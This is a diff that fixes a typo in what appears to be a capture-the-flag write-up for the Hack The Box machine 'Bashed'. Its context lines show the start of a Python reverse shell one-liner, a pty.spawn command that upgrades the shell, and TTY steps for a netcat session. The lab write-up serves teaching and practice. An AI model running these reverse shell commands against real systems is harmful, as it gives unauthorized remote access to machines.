@@ -111,7 +111,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ![](/assets/htb-bashed/python_revshell.png)
 
-It workes! Now we have to upgrade the shell to properly run the `sudo` commands we need. We can upgrade to a good `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")'`. Once that shell is spawned, we need to issue some commands to get a good TTY shell.
+It works! Now we have to upgrade the shell to properly run the `sudo` commands we need. We can upgrade to a good `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")'`. Once that shell is spawned, we need to issue some commands to get a good TTY shell.
 
 ```shell
 CTRL-Z # Sends the netcat session to the background
